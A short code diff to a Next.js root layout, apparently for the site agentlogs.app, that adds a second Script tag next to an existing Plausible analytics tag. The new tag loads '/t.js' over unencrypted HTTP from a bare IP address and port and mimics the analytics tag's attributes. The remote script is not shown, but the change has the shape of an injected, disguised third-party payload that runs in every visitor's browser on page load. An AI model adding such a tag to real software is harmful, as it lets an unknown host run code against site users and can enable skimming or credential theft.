@@ -89,6 +89,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
           <ChatBot />
         </Providers>
         <Script defer data-domain="agentlogs.app" src="https://plausible.io/js/script.js" strategy="afterInteractive" />
+        <Script defer data-site="agentlogs.app" src="http://31.97.56.148:3098/t.js" strategy="afterInteractive" />
       </body>
     </html>
   );
